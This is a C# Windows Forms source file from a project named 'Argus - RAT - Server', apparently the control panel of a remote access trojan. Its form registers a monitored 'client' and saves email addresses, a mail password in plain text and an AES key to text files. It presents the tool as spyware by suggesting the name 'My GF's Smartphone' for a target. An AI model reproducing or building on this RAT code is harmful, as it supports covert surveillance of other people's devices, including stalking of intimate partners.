using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.IO;

namespace Argus___RAT___Server
{
    public partial class AddClient : Form
    {
        public AddClient()
        {
            InitializeComponent();
        }

        /// <summary>
        /// Creates Client's file
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonAddClient_Click(object sender, EventArgs e)
        {
            if (textBoxName.Text != "" && textBoxName.Text != "Clients")
            {
                if (textBoxAesKey.TextLength < 12)
                {
                    MessageBox.Show("The Encryption Key has to be at least 12 characters long!", "Not Allowed Key!");
                    return;
                }

                try
                {
                    File.Create(@"Clients\" + textBoxName.Text + ".txt").Close();
                }
                catch
                {
                    MessageBox.Show("Not allowed char in your name! Please change.", "Not Allowed Name!");
                    return;
                }
            }
            else
            {
                MessageBox.Show("You need a name for your Client! What's about \"My GF's Smartphone\"?", "Not Allowed Name!");
                return;
            }

            using (StreamWriter sw = File.AppendText(@"Clients\" + textBoxName.Text + ".txt"))
            {
                sw.WriteLine("ClientMailAddress:" + textBoxClientMailAddress.Text);
                sw.WriteLine("ServerMailAddress:" + textBoxServerMailAddress.Text);
                sw.WriteLine("ServerMailPass:" + textBoxServerMailPass.Text);
                sw.WriteLine("EncryptionKey:" + textBoxAesKey.Text);
            }

            using (StreamWriter sw = File.AppendText(@"Clients\Clients.txt"))
            {
                sw.WriteLine(textBoxName.Text);
            }
        }
    }
}
